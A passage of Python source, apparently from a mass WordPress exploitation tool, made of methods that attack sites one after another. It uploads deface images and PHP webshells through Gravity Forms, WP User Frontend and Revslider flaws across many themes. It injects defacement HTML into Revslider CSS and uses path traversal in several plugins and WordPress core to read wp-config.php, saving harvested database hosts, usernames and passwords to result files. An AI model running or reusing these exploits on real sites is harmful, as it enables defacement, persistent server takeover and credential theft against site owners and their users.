                                Checkshell = requests.get('http://' + site + '/wp-content/vuln.php',
                                                          timeout=5, headers=self.Headers)
                                CheckIndex = requests.get('http://' + site + '/vuln.htm',
                                                          timeout=5, headers=self.Headers)
                                if 'Vuln!!' in Checkshell.text:
                                    self.Print_vuln_Shell(site + '/wp-content/vuln.php')
                                    with open('result/Shell_results.txt', 'a') as writer:
                                        writer.write(site + '/wp-content/vuln.php' + '\n')
                                if 'Vuln!!' in CheckIndex.text:
                                    self.Print_Vuln_index(site + '/vuln.htm')
                                    with open('result/Index_results.txt', 'a') as writer:
                                        writer.write(site + '/vuln.htm' + '\n')
                                else:
                                    self.Gravity_forms_Index(site)
                            else:
                                self.Gravity_forms_Index(site)
                        else:
                            self.Gravity_forms_Index(site)
                    else:
                        self.Gravity_forms_Index(site)
                except:
                    self.Print_NotVuln('Gravity-Forms', site)
            else:
                self.Print_NotVuln('Gravity Forms', site)
        except:
            self.Timeout(site)


    def Gravity_forms_Index(self, site):
        UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
        fileDeface = {'file': open(self.Jce_Deface_image, 'rb')}
        post_data = {'field_id': '3', 'form_id': '1', 'gform_unique_id': '../../../../', 'name': 'pwn.gif'}
        post_data2 = {'field_id': '3', 'form_id': '1', 'gform_unique_id': '../../../../../', 'name': 'pwn.gif'}
        try:
            url = "http://" + site + '/?gf_page=upload'
            requests.post(url, files=fileDeface, data=post_data, headers=UserAgent, timeout=5)
            requests.post(url, files=fileDeface, data=post_data2, headers=UserAgent, timeout=5)
            CheckIndex = requests.get('http://' + site + '/_input_3_pwn.gif', timeout=5, headers=self.Headers)
            CheckIndex2 = requests.get('http://' + site + '/wp-content/_input_3_pwn.gif',
                                       timeout=5, headers=self.Headers)
            if 'GIF89a' in CheckIndex.text:
                self.Print_Vuln_index(site + '/_input_3_pwn.gif')
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(site + '/_input_3_pwn.gif' + '\n')
            elif 'GIF89a' in CheckIndex2.text:
                self.Print_Vuln_index(site + '/wp-content/_input_3_pwn.gif')
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(site + '/wp-content/_input_3_pwn.gif' + '\n')
            else:
                self.Print_NotVuln('Gravity-Forms', site)
        except:
            self.Print_NotVuln('Gravity-Forms', site)

    def WP_User_Frontend(self, site):
        try:
            CheckVuln = requests.get('http://' + site + '/wp-admin/admin-ajax.php?action=wpuf_file_upload',
                                     timeout=5, headers=self.Headers)
            if 'error' in CheckVuln.text or CheckVuln.status_code == 200:
                post = {}
                UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
                post['action'] = 'wpuf_file_upload'
                files = {'wpuf_file': open(self.Jce_Deface_image, 'rb')}
                try:
                    _url = 'http://' + site + "/wp-admin/admin-ajax.php"
                    _open = requests.post(_url, files=files, data=post, headers=UserAgent, timeout=10)
                    if 'image][]' in _open.text:
                        _Def = site + "/wp-content/uploads/20" +\
                               self.year + "/" + self.month + "/" + self.Jce_Deface_image.split('/')[1]
                        Check_Deface = requests.get('http://' + _Def, timeout=5, headers=self.Headers)
                        if 'GIF89a' in Check_Deface.text:
                            self.Print_Vuln_index(_Def)
                            with open('result/Index_results.txt', 'a') as writer:
                                writer.write(_Def + '\n')
                        else:
                            self.Print_NotVuln('WP-User-Frontend', site)
                    else:
                        self.Print_NotVuln('WP-User-Frontend', site)
                except:
                    self.Print_NotVuln('WP-User-Frontend', site)
            else:
                self.Print_NotVuln('WP-User-Frontend', site)
        except:
            self.Print_NotVuln('WP-User-Frontend', site)


    def Revslider_css(self, site):
        IndeXText = 'Vuln!! Patch it Now!'
        ency = {'action': "revslider_ajax_action",
                'client_action': "update_captions_css",
                'data': "<body style='color: transparent;background-color: black'><center><h1>"
                        "<b style='color: white'>" + IndeXText + "<p style='color: transparent'>",
                }
        try:
            url = "http://" + site +\
                  "/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css"
            aa = requests.post(url, data=ency, timeout=10, headers=self.Headers)
            if 'succesfully' in aa.text:
                deface = site + '/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css'
                self.Print_Vuln_index(deface)
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(deface + '\n')
            else:
                self.Print_NotVuln('Revslider', site)
        except:
            self.Print_NotVuln('Revslider', site)

    def Revslider_SHELL(self, site):
        try:
            UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
            Exploit = 'http://' + site + '/wp-admin/admin-ajax.php'
            data = {'action': "revslider_ajax_action", 'client_action': "update_plugin"}
            FileShell = {'update_file': open(self.MailPoetZipShell, 'rb')}
            CheckRevslider = requests.get('http://' + site, timeout=10, headers=self.Headers)
            if '/wp-content/plugins/revslider/' in CheckRevslider.text:
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
                CheckRev = requests.get('http://' + site +
                                        '/wp-content/plugins/revslider/temp/update_extract/pwn.gif',
                                        timeout=10, headers=self.Headers)
                if 'GIF89a' in CheckRev.text:
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/plugins/revslider/temp/update_extract/vuln.php',
                                              timeout=10, headers=self.Headers)
                    if 'Vuln!!' in ShellCheck.text:
                        self.Print_vuln_Shell(site + '/wp-content/plugins/revslider/temp/update_extract/vuln.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(site + '/wp-content/plugins/revslider/temp/update_extract/vuln.php' + '\n')
                    self.Print_Vuln_index(site + '/wp-content/plugins/revslider/temp/update_extract/pwn.gif')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/wp-content/plugins/revslider/temp/update_extract/pwn.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/Avada/' in CheckRevslider.text:
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
                CheckRev1 = requests.get('http://' + site +
                                         '/wp-content/themes/Avada/framework/plugins/'
                                         'revslider/temp/update_extract/pwn.gif', timeout=10, headers=self.Headers)
                if 'GIF89a' in CheckRev1.text:
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/Avada/framework/plugins/'
                                              'revslider/temp/update_extract/vuln.php',
                                              timeout=10, headers=self.Headers)
                    if 'Vuln!!' in ShellCheck.text:
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/vuln.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/Avada/framework/plugins/'
                                       'revslider/temp/update_extract/vuln.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/Avada/framework/plugins/'
                               'revslider/temp/update_extract/pwn.gif')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/Avada/framework/plugins/'
                                   'revslider/temp/update_extract/pwn.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/striking_r/' in CheckRevslider.text:
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
                CheckRev2 = requests.get('http://' + site +
                                         '/wp-content/themes/striking_r/framework/plugins/'
                                         'revslider/temp/update_extract/pwn.gif', timeout=10, headers=self.Headers)
                if 'GIF89a' in CheckRev2.text:
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/striking_r/framework/plugins/'
                                              'revslider/temp/update_extract/vuln.php',
                                              timeout=10, headers=self.Headers)
                    if 'Vuln!!' in ShellCheck.text:
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/striking_r/framework/'
                                   'plugins/revslider/temp/update_extract/vuln.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/striking_r/framework/plugins/'
                                       'revslider/temp/update_extract/vuln.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/pwn.gif')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/striking_r/framework/'
                                   'plugins/revslider/temp/update_extract/pwn.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/IncredibleWP/' in CheckRevslider.text:
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
                CheckRev3 = requests.get('http://' + site +
                                         '/wp-content/themes/IncredibleWP/framework/'
                                         'plugins/revslider/temp/update_extract/pwn.gif',
                                         timeout=5, headers=self.Headers)
                if 'GIF89a' in CheckRev3.text:
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/IncredibleWP/framework'
                                              '/plugins/revslider/temp/update_extract/vuln.php',
                                              timeout=5, headers=self.Headers)
                    if 'Vuln!!' in ShellCheck.text:
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/IncredibleWP/framework/'
                                   'plugins/revslider/temp/update_extract/vuln.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/IncredibleWP/'
                                       'framework/plugins/revslider/temp/update_extract/vuln.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/IncredibleWP/'
                               'framework/plugins/revslider/temp/update_extract/pwn.gif')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/IncredibleWP/'
                                   'framework/plugins/revslider/temp/update_extract/pwn.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/ultimatum/' in CheckRevslider.text:
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
                CheckRev4 = requests.get('http://' + site +
                                         '/wp-content/themes/ultimatum/wonderfoundry/'
                                         'addons/plugins/revslider/temp/update_extract/pwn.gif',
                                         timeout=5, headers=self.Headers)
                if 'GIF89a' in CheckRev4.text:
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/ultimatum/wonderfoundry/'
                                              'addons/plugins/revslider/temp/update_extract/vuln.php',
                                              timeout=5, headers=self.Headers)
                    if 'Vuln!!' in ShellCheck.text:
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/ultimatum/wonderfoundry/addons/'
                                   'plugins/revslider/temp/update_extract/vuln.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/ultimatum/wonderfoundry/'
                                       'addons/plugins/revslider/temp/update_extract/vuln.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/'
                               'revslider/temp/update_extract/pwn.gif')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/'
                                   'revslider/temp/update_extract/pwn.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/medicate/' in CheckRevslider.text:
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
                CheckRev5 = requests.get('http://' + site +
                                         '/wp-content/themes/medicate/script/'
                                         'revslider/temp/update_extract/pwn.gif', timeout=10, headers=self.Headers)
                if 'GIF89a' in CheckRev5.text:
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/medicate/script/revslider/'
                                              'temp/update_extract/vuln.php', timeout=10, headers=self.Headers)
                    if 'Vuln!!' in ShellCheck.text:
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/medicate/script/'
                                   'revslider/temp/update_extract/vuln.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/medicate/script/'
                                       'revslider/temp/update_extract/vuln.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/medicate/script/revslider/temp/update_extract/pwn.gif')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/medicate/script/revslider/'
                                   'temp/update_extract/pwn.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/centum/' in CheckRevslider.text:
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
                CheckRev6 = requests.get('http://' + site +
                                         '/wp-content/themes/centum/revslider/'
                                         'temp/update_extract/pwn.gif', timeout=10, headers=self.Headers)
                if 'GIF89a' in CheckRev6.text:
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/centum/revslider/'
                                              'temp/update_extract/vuln.php', timeout=10, headers=self.Headers)
                    if 'Vuln!!' in ShellCheck.text:
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/centum/revslider/temp/update_extract/vuln.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/centum/revslider/temp/update_extract/vuln.php' + '\n')
                    self.Print_Vuln_index(site + '/wp-content/themes/centum/revslider/temp/update_extract/pwn.gif')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/centum/revslider/temp/update_extract/pwn.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/beach_apollo/' in CheckRevslider.text:
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
                CheckRev7 = requests.get('http://' + site +
                                         '/wp-content/themes/beach_apollo/advance/plugins/'
                                         'revslider/temp/update_extract/pwn.gif', timeout=10, headers=self.Headers)
                if 'GIF89a' in CheckRev7.text:
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/beach_apollo/advance/plugins/'
                                              'revslider/temp/update_extract/vuln.php', timeout=10, headers=self.Headers)
                    if 'Vuln!!' in ShellCheck.text:
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/beach_apollo/advance/plugins/'
                                   'revslider/temp/update_extract/vuln.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/beach_apollo/advance/plugins/'
                                       'revslider/temp/update_extract/vuln.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/beach_apollo/advance/plugins/'
                               'revslider/temp/update_extract/pwn.gif')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/beach_apollo/advance/plugins/'
                                   'revslider/temp/update_extract/pwn.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/cuckootap/' in CheckRevslider.text:
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
                CheckRev8 = requests.get('http://' + site +
                                         '/wp-content/themes/cuckootap/framework/plugins/'
                                         'revslider/temp/update_extract/pwn.gif', timeout=10, headers=self.Headers)
                if 'GIF89a' in CheckRev8.text:
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/cuckootap/framework/plugins/'
                                              'revslider/temp/update_extract/vuln.php', timeout=10, headers=self.Headers)
                    if 'Vuln!!' in ShellCheck.text:
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/cuckootap/framework/plugins/'
                                   'revslider/temp/update_extract/vuln.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/cuckootap/framework/plugins/revslider/'
                                       'temp/update_extract/vuln.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/pwn.gif')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/cuckootap/framework/plugins/'
                                   'revslider/temp/update_extract/pwn.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/pindol/' in CheckRevslider.text:
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
                CheckRev9 = requests.get('http://' + site +
                                         '/wp-content/themes/pindol/revslider/'
                                         'temp/update_extract/pwn.gif', timeout=10, headers=self.Headers)
                if 'GIF89a' in CheckRev9.text:
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/pindol/revslider/'
                                              'temp/update_extract/vuln.php', timeout=10, headers=self.Headers)
                    if 'Vuln!!' in ShellCheck.text:
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/pindol/revslider/temp/update_extract/vuln.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/pindol/revslider/temp/update_extract/vuln.php' + '\n')
                    self.Print_Vuln_index(site + '/wp-content/themes/pindol/revslider/temp/update_extract/pwn.gif')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/pindol/revslider/temp/update_extract/pwn.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/designplus/' in CheckRevslider.text:
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
                CheckRev10 = requests.get('http://' + site +
                                          '/wp-content/themes/designplus/framework/plugins'
                                          '/revslider/temp/update_extract/pwn.gif', timeout=10, headers=self.Headers)
                if 'GIF89a' in CheckRev10.text:
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/designplus/framework/plugins/'
                                              'revslider/temp/update_extract/vuln.php', timeout=10, headers=self.Headers)
                    if 'Vuln!!' in ShellCheck.text:
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/designplus/framework/plugins/revslider/'
                                   'temp/update_extract/vuln.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/designplus/framework/plugins/revslider/temp/'
                                       'update_extract/vuln.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/pwn.gif')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/designplus/framework/plugins/revslider/'
                                   'temp/update_extract/pwn.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/rarebird/' in CheckRevslider.text:
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
                CheckRev11 = requests.get('http://' + site +
                                          '/wp-content/themes/rarebird/framework/plugins/revslider/'
                                          'temp/update_extract/pwn.gif', timeout=10, headers=self.Headers)
                if 'GIF89a' in CheckRev11.text:
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/rarebird/framework/plugins/revslider/temp'
                                              '/update_extract/vuln.php', timeout=10, headers=self.Headers)
                    if 'Vuln!!' in ShellCheck.text:
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/rarebird/framework/plugins/revslider/temp/'
                                   'update_extract/vuln.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/rarebird/framework/plugins/revslider/temp/'
                                       'update_extract/vuln.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/rarebird/framework/plugins/revslider/temp/'
                               'update_extract/pwn.gif')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/rarebird/framework/plugins/revslider/temp/'
                                   'update_extract/pwn.gif' + '\n')
                    self.Revslider_Config(site)

                else:
                    self.Revslider_Config(site)
            elif '/wp-content/themes/Avada/' in CheckRevslider.text:
                requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=10)
                CheckRev12 = requests.get('http://' + site +
                                          '/wp-content/themes/andre/framework/plugins/revslider/temp/'
                                          'update_extract/pwn.gif', timeout=10, headers=self.Headers)
                if 'GIF89a' in CheckRev12.text:
                    ShellCheck = requests.get('http://' + site +
                                              '/wp-content/themes/andre/framework/plugins/revslider/temp/'
                                              'update_extract/vuln.php', timeout=10, headers=self.Headers)
                    if 'Vuln!!' in ShellCheck.text:
                        self.Print_vuln_Shell(
                            site + '/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/vuln.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(
                                site + '/wp-content/themes/andre/framework/plugins/revslider/temp/'
                                       'update_extract/vuln.php' + '\n')
                    self.Print_Vuln_index(
                        site + '/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/pwn.gif')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/andre/framework/plugins/revslider/temp/'
                                   'update_extract/pwn.gif' + '\n')
                    self.Revslider_Config(site)
                else:
                    self.Revslider_Config(site)
            else:
                self.Print_NotVuln('revslider', site)
        except:
            self.Print_NotVuln('revslider', site)

    def Revslider_Config(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'
            GetConfig = requests.get(Exp, timeout=10, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('result/Config_results.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('result/Config_results.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                    self.Revslider_css(site)
                except:
                    self.Revslider_css(site)
            else:
                self.Revslider_css(site)
        except:
            self.Revslider_css(site)
    
    def PlugineBook(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=10, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('result/Config_results.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('result/Config_results.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                    self.Print_vuln_Config(site)
                except:
                    self.Print_NotVuln("No conf",site)
            else:
                self.Print_NotVuln("No conf",site)
        except:
            self.Print_NotVuln("No conf",site)        


    def PluginBackgroundTakeover(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/plugins/wpsite-background-takeover/exports/download.php?filename=../../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=10, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('result/Config_results.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('result/Config_results.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                    self.Print_vuln_Config(site)
                except:
                    self.Print_NotVuln("No conf",site)
            else:
                self.Print_NotVuln("No conf",site)
        except:
            self.Print_NotVuln("No conf",site) 

    def PluginSEHTML5(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/plugins/se-html5-album-audio-player/download_audio.php?file=../../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=10, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('result/Config_results.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('result/Config_results.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                    self.Print_vuln_Config(site)
                except:
                    self.Print_NotVuln("No conf",site)
            else:
                self.Print_NotVuln("No conf",site)
        except:
            self.Print_NotVuln("No conf",site)  

    def PluginWPDBBac(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-admin/edit.php?page=wp-db-backup.php&backup=../../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=10, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('result/Config_results.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('result/Config_results.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                    self.Print_vuln_Config(site)
                except:
                    self.Print_NotVuln("No conf",site)
            else:
                self.Print_NotVuln("No conf",site)
        except:
            self.Print_NotVuln("No conf",site)         


    def WordPressCore(self, site):
        try:
            Exp = 'http://' + site + \
                  '/?cat=1.php/../../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=10, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('result/Config_results.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('result/Config_results.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                    self.Print_vuln_Config(site)
                except:
                    self.Print_NotVuln("No conf",site)
            else:
                self.Print_NotVuln("No conf",site)
        except:
            self.Print_NotVuln("No conf",site)   

    def PluginSEO(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/plugins/seo-automatic-seo-tools/feedcommander/get_download.php?file=../../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=10, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('result/Config_results.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('result/Config_results.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                    self.Print_vuln_Config(site)
                except:
                    self.Print_NotVuln("No conf",site)
            else:
                self.Print_NotVuln("No conf",site)
        except:
            self.Print_NotVuln("No conf",site)       
    def PluginPaidMemberships(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-admin/admin-ajax.php?action=getfile&/../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=10, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('result/Config_results.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('result/Config_results.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                    self.Print_vuln_Config(site)
                except:
                    self.Print_NotVuln("No conf",site)
            else:
                self.Print_NotVuln("No conf",site)
        except:
